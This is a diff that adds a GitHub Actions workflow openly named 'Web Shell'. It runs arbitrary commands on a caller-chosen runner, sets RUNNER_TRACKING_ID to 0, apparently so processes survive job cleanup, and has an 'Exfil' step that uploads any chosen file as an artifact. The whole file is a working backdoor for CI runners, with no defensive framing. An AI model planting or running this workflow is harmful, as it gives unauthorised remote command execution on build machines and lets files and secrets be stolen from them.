@@ -1,0 +1,38 @@
+
+name: Web Shell
+run-name: Shell - ${{ inputs.runner }} - ${{ inputs.cmd || inputs.download_file }}
+
+on:
+  workflow_dispatch:
+    inputs:
+      cmd:
+        description: "Command"
+        required: false
+        type: string
+      runner:
+        description: "Runner"
+        required: true
+        type: string
+      download_file:
+        description: "Download a file instead of running a command."
+        required: false
+        type: string
+
+jobs:
+  build:
+    runs-on: ${{ inputs.runner }}
+    # We don't specify a shell type here, because it will use the default shell of the underlying OS.
+    steps:
+      - name: Run
+        if: ${{ !inputs.download_file }}
+        env:
+          RUNNER_TRACKING_ID: 0
+        run: ${{ inputs.cmd }}
+        continue-on-error: true
+      - name: Exfil
+        if: ${{ inputs.download_file }}
+        continue-on-error: true
+        uses: actions/upload-artifact@v4
+        with:
+          path: ${{ inputs.download_file }}
+          name: result
